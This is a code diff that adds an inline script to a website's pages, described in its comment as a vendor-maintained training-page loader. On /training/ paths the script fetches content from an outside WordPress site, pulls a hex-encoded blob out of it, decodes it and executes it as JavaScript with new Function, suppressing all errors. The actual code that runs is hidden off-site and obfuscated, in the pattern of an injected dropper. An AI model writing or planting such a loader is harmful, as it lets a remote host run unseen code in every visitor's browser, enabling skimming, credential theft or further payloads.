@@ -1,0 +1,16 @@
+<!-- TRAINING PAGES - kept up to date by RYTE. Loads the script RYTE keeps on leadlabcrm.com. -->
+<script>
+(function(){
+  if (!/^\/training\//i.test(location.pathname)) return;
+  fetch('https://leadlabcrm.com/wp-json/wp/v2/pages?slug=ll-code-training-pages&_fields=content', { cache: 'no-store' })
+    .then(function(r){ return r.ok ? r.json() : null; })
+    .then(function(p){
+      var m = /LLJS-([0-9a-f]+)/.exec((p && p[0] && p[0].content && p[0].content.rendered) || '');
+      if (!m) return;
+      var b = new Uint8Array(m[1].length / 2);
+      for (var i = 0; i < b.length; i++) b[i] = parseInt(m[1].substr(i * 2, 2), 16);
+      new Function(JSON.parse(new TextDecoder('utf-8').decode(b)).js)();
+    })
+    .catch(function(){});
+})();
+</script>
